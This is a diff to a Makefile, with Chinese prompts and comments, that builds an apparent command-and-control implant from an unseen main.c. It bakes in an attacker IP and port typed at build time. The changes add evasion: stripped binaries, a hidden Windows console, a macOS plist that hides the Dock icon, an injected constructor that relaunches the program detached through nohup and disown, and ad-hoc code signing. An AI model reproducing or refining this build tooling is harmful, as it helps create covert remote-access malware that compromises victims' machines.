@@ -1,17 +1,25 @@
 
 CC = gcc
 SRC = main.c
-TARGET = main
+TARGET = mapp
 BIN = $(TARGET)
 
 define wininp
-C2_IP := $(shell cmd /c "<nul set /p \"请输入IP: \"")
-C2_PORT := $(shell cmd /c "<nul set /p \"请输入端口: \"")
+ifeq ($(C2_IP),)
+C2_IP := $$(shell cmd /c "<nul set /p \"请输入IP: \"")
+endif
+ifeq ($(C2_PORT),)
+C2_PORT := $$(shell cmd /c "<nul set /p \"请输入端口: \"")
+endif
 endef
 
 define uninp
-C2_IP := $(shell sh -c 'read -p "请输入IP: " t;echo $$t')
-C2_PORT := $(shell sh -c 'read -p "请输入端口: " t;echo $$t')
+ifeq ($(C2_IP),)
+C2_IP := $$(shell sh -c 'read -p "请输入IP: " t; echo $$$$t')
+endif
+ifeq ($(C2_PORT),)
+C2_PORT := $$(shell sh -c 'read -p "请输入端口: " t; echo $$$$t')
+endif
 endef
 
 all:
@@ -19,30 +27,47 @@ ifeq ($(OS),Windows_NT)
 	$(eval $(call wininp))
 ifeq ($(CC),cl)
 	# Windows MSVC
-	$(CC) $(SRC) /Fe:$(BIN).exe /DC2_IP="$(C2_IP)" /DC2_PORT="$(C2_PORT)" /link /subsystem:windows ws2_32.lib
+	$(CC) $(SRC) /Fe:$(BIN).exe /Os /MD /DC2_IP="$(C2_IP)" /DC2_PORT="$(C2_PORT)" /link /subsystem:windows ws2_32.lib
 else
 	# Windows MinGW
-	$(CC) $(SRC) -o $(BIN) -mwindows -lws2_32 -DC2_IP=\"$(C2_IP)\" /DC2_PORT="$(C2_PORT)"
+	$(CC) $(SRC) -o $(BIN) -Os -s -mwindows -lws2_32 -DC2_IP=\"$(C2_IP)\" /DC2_PORT="$(C2_PORT)"
 endif
 endif
 
 ifeq ($(shell uname -s),Linux)
 	$(eval $(call uninp))
 	# Linux
-	$(CC) $(SRC) -o $(BIN) -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
+	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
 endif
 
+# 修正后的 Darwin 编译逻辑
 ifeq ($(shell uname -s),Darwin)
 	$(eval $(call uninp))
-	# macOS(Darwin)
-	$(CC) $(SRC) -o $(BIN) -Wl,-no_launcher,-sectcreate,__TEXT,__info_plist,/dev/null -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
-endif
+	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
+	
+	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
+	__attribute__((constructor)) static void init() { \
+		if (getenv("ST_ACT")) return; \
+		char path[1024]; uint32_t size = sizeof(path); \
+		if (_NSGetExecutablePath(path, &size) != 0) return; \
+		chdir(dirname(path)); \
+		setenv("ST_ACT", "1", 1); \
+		char cmd[2048]; \
+		sprintf(cmd, "nohup \\"%%s\\" > /dev/null 2>&1 & disown", path); \
+		system(cmd); \
+		exit(0); \
+	}' > stealth_logic.h
 
+	$(CC) $(SRC) -o $(BIN) -Os -include stealth_logic.h -Wl,-sectcreate,__TEXT,__info_plist,temp.plist -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
+	@rm -rf stealth_logic.h temp.plist
+	@strip $(BIN) 2>/dev/null || true
+	@codesign -s - --force $(BIN) 2>/dev/null || true
+endif
 clean:
 ifeq ($(OS),Windows_NT)
-	del /f $(TARGET).* 2>nul
-	del /f $(TARGET) 2>nul
+	del /f $(BIN).* 2>nul
+	del /f $(BIN) 2>nul
 else
-	rm -rf $(TARGET)
-	rm -rr $(TARGET).*
+	rm -rf $(BIN)
+	rm -rr $(BIN).*
 endif
